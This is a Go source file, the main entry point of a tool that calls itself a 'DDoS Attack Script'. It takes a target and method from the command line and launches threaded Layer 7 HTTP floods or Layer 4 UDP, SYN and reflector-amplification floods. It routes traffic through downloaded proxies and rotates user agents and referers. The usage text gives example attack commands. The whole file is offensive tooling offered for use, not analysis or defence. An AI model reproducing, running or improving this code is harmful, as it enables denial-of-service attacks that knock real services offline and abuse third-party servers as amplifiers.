package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/go-ddos-tools/pkg/attacks"
	"github.com/go-ddos-tools/pkg/config"
	"github.com/go-ddos-tools/pkg/methods"
	"github.com/go-ddos-tools/pkg/proxy"
	"github.com/go-ddos-tools/pkg/tools"
	"github.com/go-ddos-tools/pkg/utils"
)

const version = "2.4 SNAPSHOT (Go)"

var (
	requestsSent = utils.NewCounter()
	bytesSent    = utils.NewCounter()
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			log.Println("Recovered from panic:", r)
		}
	}()

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	if len(os.Args) < 2 {
		printUsage()
		return
	}

	command := strings.ToUpper(os.Args[1])

	switch command {
	case "HELP":
		printUsage()
	case "TOOLS":
		tools.RunConsole()
	case "STOP":
		tools.StopAllAttacks()
	default:
		if err := runAttack(); err != nil {
			log.Fatalf("Error: %v", err)
		}
	}
}

func runAttack() error {
	if len(os.Args) < 3 {
		return fmt.Errorf("insufficient arguments")
	}

	method := strings.ToUpper(os.Args[1])
	target := os.Args[2]

	// Load configuration
	cfg, err := config.LoadConfig("config.json")
	if err != nil {
		return fmt.Errorf("failed to load config: %v", err)
	}

	// Normalize target URL
	if !strings.HasPrefix(target, "http") && !strings.Contains(target, ":") {
		target = "http://" + target
	}

	// Check if method is valid
	if !methods.IsValidMethod(method) {
		return fmt.Errorf("invalid method: %s", method)
	}

	var wg sync.WaitGroup
	stopChan := make(chan struct{})

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	if methods.IsLayer7Method(method) {
		return runLayer7Attack(method, target, cfg, &wg, stopChan, sigChan)
	} else if methods.IsLayer4Method(method) {
		return runLayer4Attack(method, target, cfg, &wg, stopChan, sigChan)
	}

	return fmt.Errorf("unknown method type: %s", method)
}

func runLayer7Attack(method, target string, cfg *config.Config, wg *sync.WaitGroup, stopChan chan struct{}, sigChan chan os.Signal) error {
	if len(os.Args) < 8 {
		return fmt.Errorf("insufficient arguments for Layer7 attack")
	}

	proxyType, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]
	rpc, _ := strconv.Atoi(os.Args[6])
	duration, _ := strconv.Atoi(os.Args[7])

	// Load or download proxies
	var proxies []proxy.Proxy
	if proxyFile != "" {
		proxyPath := filepath.Join("files", "proxies", proxyFile)
		var err error
		proxies, err = proxy.LoadOrDownloadProxies(proxyPath, proxyType, cfg, target, threads)
		if err != nil {
			log.Printf("Error loading proxies: %v", err)
			log.Println("Continuing without proxies")
		}
		if len(proxies) == 0 {
			log.Println("Warning: Empty Proxy File, running flood without proxy")
		}
	}

	// Load user agents and referers
	userAgents, _ := utils.LoadLines(filepath.Join("files", "useragent.txt"))
	referers, _ := utils.LoadLines(filepath.Join("files", "referers.txt"))

	if len(userAgents) == 0 {
		userAgents = utils.GetDefaultUserAgents()
	}
	if len(referers) == 0 {
		referers = utils.GetDefaultReferers()
	}

	log.Printf("Attack Started to %s with %s method for %d seconds, threads: %d!",
		target, method, duration, threads)

	// Create attack configuration
	attackCfg := &attacks.Layer7Config{
		Method:     method,
		Target:     target,
		Threads:    threads,
		RPC:        rpc,
		Duration:   duration,
		Proxies:    proxies,
		UserAgents: userAgents,
		Referers:   referers,
	}

	// Start attack
	go func() {
		attacks.RunLayer7Attack(attackCfg, wg, stopChan, requestsSent, bytesSent)
	}()

	// Monitor attack
	monitorAttack(duration, method, target, stopChan, sigChan)

	wg.Wait()
	return nil
}

func runLayer4Attack(method, target string, cfg *config.Config, wg *sync.WaitGroup, stopChan chan struct{}, sigChan chan os.Signal) error {
	if len(os.Args) < 5 {
		return fmt.Errorf("insufficient arguments for Layer4 attack")
	}

	threads, _ := strconv.Atoi(os.Args[3])
	duration, _ := strconv.Atoi(os.Args[4])

	// Parse target (host:port)
	var host string
	var port int
	if strings.Contains(target, "://") {
		// Remove protocol
		parts := strings.Split(target, "://")
		if len(parts) > 1 {
			target = parts[1]
		}
	}

	if strings.Contains(target, ":") {
		parts := strings.Split(target, ":")
		host = parts[0]
		port, _ = strconv.Atoi(parts[1])
	} else {
		host = target
		port = 80
	}

	// Resolve hostname
	ips, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("cannot resolve hostname %s: %v", host, err)
	}
	host = ips[0].String()

	var proxies []proxy.Proxy
	var reflectors []string

	// Check for additional arguments (proxies or reflectors)
	if len(os.Args) >= 7 {
		arg5 := os.Args[5]
		if methods.IsAmplificationMethod(method) {
			// Load reflectors
			reflectorFile := filepath.Join("files", arg5)
			reflectors, _ = utils.LoadLines(reflectorFile)
			if len(reflectors) == 0 {
				log.Println("Warning: No reflectors loaded")
			}
		} else if arg5Num, err := strconv.Atoi(arg5); err == nil {
			// Load or download proxies
			proxyFile := os.Args[6]
			proxyPath := filepath.Join("files", "proxies", proxyFile)
			targetURL := fmt.Sprintf("%s:%d", host, port)
			proxies, err = proxy.LoadOrDownloadProxies(proxyPath, arg5Num, cfg, targetURL, threads)
			if err != nil {
				log.Printf("Error loading proxies: %v", err)
				log.Println("Continuing without proxies")
			}
			if len(proxies) == 0 {
				log.Println("Warning: Empty Proxy File, running flood without proxy")
			}
		}
	}

	log.Printf("Attack Started to %s:%d with %s method for %d seconds, threads: %d!",
		host, port, method, duration, threads)

	// Create attack configuration
	attackCfg := &attacks.Layer4Config{
		Method:     method,
		Host:       host,
		Port:       port,
		Threads:    threads,
		Duration:   duration,
		Proxies:    proxies,
		Reflectors: reflectors,
		ProtocolID: cfg.MinecraftProtocol,
	}

	// Start attack
	go func() {
		attacks.RunLayer4Attack(attackCfg, wg, stopChan, requestsSent, bytesSent)
	}()

	// Monitor attack
	targetStr := fmt.Sprintf("%s:%d", host, port)
	monitorAttack(duration, method, targetStr, stopChan, sigChan)

	wg.Wait()
	return nil
}

func monitorAttack(duration int, method, target string, stopChan chan struct{}, sigChan chan os.Signal) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()
	endTime := startTime.Add(time.Duration(duration) * time.Second)

	for {
		select {
		case <-sigChan:
			log.Println("\nAttack stopped by user")
			close(stopChan)
			return
		case <-ticker.C:
			if time.Now().After(endTime) {
				log.Println("\nAttack duration completed")
				close(stopChan)
				return
			}

			elapsed := time.Since(startTime).Seconds()
			progress := (elapsed / float64(duration)) * 100

			reqs := requestsSent.Get()
			bytes := bytesSent.Get()

			log.Printf("Target: %s, Method: %s, PPS: %s, BPS: %s / %.2f%%",
				target, method,
				utils.HumanFormat(reqs),
				utils.HumanBytes(bytes),
				progress)

			requestsSent.Set(0)
			bytesSent.Set(0)
		}
	}
}

func printUsage() {
	fmt.Printf(`DDoS-Tools - DDoS Attack Script (Go Version %s)

Usage:
  Layer7: %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
  Layer4: %s <method> <ip:port> <threads> <duration>
  Layer4 with Proxies: %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
  Layer4 Amplification: %s <method> <ip:port> <threads> <duration> <reflector_file>

Commands:
  HELP   - Show this help message
  TOOLS  - Run interactive tools console
  STOP   - Stop all running attacks

Layer7 Methods (%d):
  %s

Layer4 Methods (%d):
  %s

Amplification Methods (%d):
  %s

Examples:
  %s GET http://example.com 5 100 proxies.txt 100 60
  %s UDP 192.168.1.1:80 100 60
  %s SYN 192.168.1.1:80 100 60
`,
		version, os.Args[0], os.Args[0], os.Args[0], os.Args[0],
		len(methods.Layer7Methods), strings.Join(methods.Layer7Methods, ", "),
		len(methods.Layer4Methods), strings.Join(methods.Layer4Methods, ", "),
		len(methods.AmplificationMethods), strings.Join(methods.AmplificationMethods, ", "),
		os.Args[0], os.Args[0], os.Args[0])
}
